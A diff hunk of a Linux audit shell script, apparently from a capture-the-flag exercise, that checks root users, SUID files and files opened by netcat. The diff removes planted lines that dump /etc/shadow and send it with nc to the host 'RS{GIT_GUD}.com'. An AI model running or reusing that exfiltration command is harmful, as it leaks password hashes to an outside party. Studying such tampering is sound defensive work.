@@ -49,8 +49,6 @@ echo users with root or UID is 0
 grep 'x:0:' /etc/passwd
 echo
 echo root SUID files
-echo /etc/passwd
-sudo !!
 find /-uid 0 -perm -4000 2>/dev/null
 #or find / -perm -04000
 echo
@@ -61,11 +59,6 @@ echo files opened by netcat
 lsof | awk '{print $1, $NF}' | grep -E "^nc"
 echo
 echo open unlinked files 
-find /etc/passwd
-find /etc/shadow
-cat /etc/passwd | passwd.txt
-cat /etc/shadow | shadow.txt
-nc RS{GIT_GUD}.com 22 < shadow.txt
 lsof +L1
 echo
 echo file modded in 24hrs
